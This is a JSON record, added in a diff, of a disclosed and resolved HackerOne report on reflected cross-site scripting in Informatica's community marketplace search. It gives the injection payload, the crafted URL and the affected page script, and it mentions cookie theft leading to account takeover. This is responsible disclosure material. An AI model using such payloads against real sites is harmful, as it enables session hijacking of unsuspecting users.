@@ -1,0 +1,106 @@
+{
+  "id": 47235,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzIzNQ==",
+  "url": "https://hackerone.com/reports/47235",
+  "title": "XSS in Search Communities Function",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2015-02-09T18:51:57.267Z",
+  "submitted_at": "2015-02-09T18:51:57.267Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ddworken",
+    "url": "/ddworken",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 453,
+    "url": "https://hackerone.com/informatica",
+    "handle": "informatica",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Informatica",
+      "twitter_handle": "informatica",
+      "website": "https://www.informatica.com/",
+      "about": "Informatica Corporation is the world’s number one independent provider of data integration software."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2015-07-31T23:09:46.281Z",
+  "bug_reporter_agreed_on_going_public_at": "2015-07-01T23:09:29.716Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "When you search for a URL on the communities page, you visit a URL that looks like this\r\n```\r\nhttps://community.informatica.com/community/marketplace/search/?blkCatIds=free+apps&view=solution\r\n```\r\n\r\nBy replacing the search query with \r\n``` html\r\n\";alert(0);t=\"\r\n```\r\n\r\nand making the final URL:\r\n\r\n```\r\nhttps://community.informatica.com/community/marketplace/%22;alert(0);t=%22/?blkCatIds=free+apps&view=solution\r\n```\r\n\r\nYou make the page's javascript code, turn into\r\n\r\n``` javascript\r\n        var profileShortUrl = \"/profile-short.jspa\";\r\n        var profileLoadingTooltip = \"Loading user profile\";\r\n        var profileErrorTooltip = \"There was an error loading that profile information.\";\r\n\r\n        var projectChooserUrl = \"/community/marketplace/\";\r\n        alert(0);\r\n        t=\"/project-chooser!input.jspa\";\r\n\r\n        var containerShortUrl = \"/container-short.jspa\";\r\n        var containerLoadingTooltip = \"Loading place information.\";\r\n        var containerErrorTooltip = \"There was an error loading that place information.\";\r\n\r\n        var videoShortUrl = \"/view-video-short.jspa\";\r\n        var videoLoadingTooltip = \"video.tooltip.loading\";\r\n        var videoErrorTooltip = \"video.tooltip.error\";\r\n        var _jive_video_picker__url = \"?container=1&containerType=14\";\r\n        var followErrorMessage = \"An internal error ocurred while following the project or space.\";\r\n\r\n        (function() {\r\n            var originalWrite = document.write;\r\n            document.write = function() {\r\n                if(typeof $j != 'undefined' && $j.isReady) {\r\n                    console.warn(\"document.write called after document was loaded: \", arguments);\r\n                }\r\n                else {\r\n                    // In IE before version 8 `document.write()` does not\r\n                    // implement Function methods, like `apply()`.\r\n                    return Function.prototype.apply.call(originalWrite, document, arguments);\r\n                }\r\n            }\r\n        })();        \r\n```\r\nThis is an example of a injected javascript XSS vulnerability. With this, one can also exfiltrtrate user's cookies to another server allowing account takeovers. ",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2015-07-31T23:09:38.293Z",
+  "allow_singular_disclosure_after": -269440002.3246814,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "shivammusic"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
